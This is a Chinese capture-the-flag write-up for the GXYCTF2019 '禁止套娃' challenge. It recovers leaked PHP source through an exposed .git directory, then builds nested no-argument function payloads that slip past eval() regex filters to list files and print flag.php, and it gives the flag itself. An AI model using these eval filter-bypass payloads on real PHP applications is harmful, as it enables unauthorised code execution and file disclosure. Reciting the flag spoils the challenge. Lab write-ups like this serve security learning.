# [GXYCTF2019]禁止套娃

[题目地址](https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83)

这题每一步都是那么恰到好处，差一点都不行。

进入网站，空空如也，就一句话。源代码没东西，直接扫目录，管那么多干啥扫就完事了。扫出来几个.git目录下的文件，那就是.git目录泄漏了。githack恢复网站源码。

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

又是烦人的正则。第一个正则明显是过滤php伪协议的，让你不能直接读flag。第二个正则绕了个圈子，[preg_replace](https://www.runoob.com/php/php-preg_replace.html)返回的是替换后的字符串，这里要求返回的内容完全等同于`;`，那就是说我们的payload必须完全符合`/[a-z,_]+\((?R)?\)/`的格式，还要留个`;`。`[a-z,_]+`应该是全小写字母加上一个`_`可以用，后面的`(?R)?`是一体的，表示php里的[递归匹配](https://www.laruence.com/2011/09/30/2179.html)。整体连在一起表示我们可以`全小写字母_(全小写字母_(全小写字母_(全小写字母_())));`这么无限套下去。

后面又是对exp内容的过滤。过滤了一些输出flag的函数，这样就算我们找到了flag文件，也不能用诸如hex的函数打印出来。很好分析一波后发现我不会，看[wp](https://blog.csdn.net/weixin_44037296/article/details/111404335)。

首要思路是得知flag文件叫什么名字。[scandir](https://www.runoob.com/php/func-directory-scandir.html)可以列出（注意是列出而不是打印出，这个函数会返回列出的结果，因此后面我们还要另一个函数打印出结果）参数指定的目录。有一个麻烦的事情，就给了小写字母和下划线，目录根本没法构造。变不出来`/`，但是大佬们能变出来代表当前目录的`.`。看这个实验：

```php
print_r(localeconv());
```

[localeconv()](https://www.runoob.com/php/func-string-localeconv.html)返回一个包含本地数字及货币格式信息的数组。这和路径有什么关系？本题第一个巧合，这个函数返回的数组第一个元素固定为小数点，也就是`.`。用[current](https://www.runoob.com/php/func-array-current.html)函数正好可以直接取出来。取出来后作为scandir的参数，再用[print_r](https://www.runoob.com/php/php-print_r-function.html)输出，我们就看见了当前目录下的文件。

- http://1e11f2ba-db33-4f59-aa3f-d81eed7ca030.node4.buuoj.cn:81/?exp=print_r(scandir(current(localeconv())));
> Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )

常规名字。现在读文件又有问题了。能变出来.总不可能变出来flag.php了吧？现在用current函数只能取出`.`，[next](https://www.runoob.com/php/func-array-next.html)函数只能取出`..`，而且这个函数是不能嵌套的。本题第二个巧合，flag文件是倒数第二个。前面说的先next最多取到第二个元素，倒数第二个也算第二个。我们先[array_reverse](https://www.runoob.com/php/func-array-reverse.html)函数将数组倒转，关键这个函数会返回倒转后的数组。倒过来再用刚才提到的方法就能获取到flag.php了。

最后一个难题，怎么输出？题目末尾的注释已经把答案告诉我们了。构造payload。

- http://1e11f2ba-db33-4f59-aa3f-d81eed7ca030.node4.buuoj.cn:81/?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));

## Flag
> flag{8ca80a85-08ad-4c92-85e0-66b48fa892b8}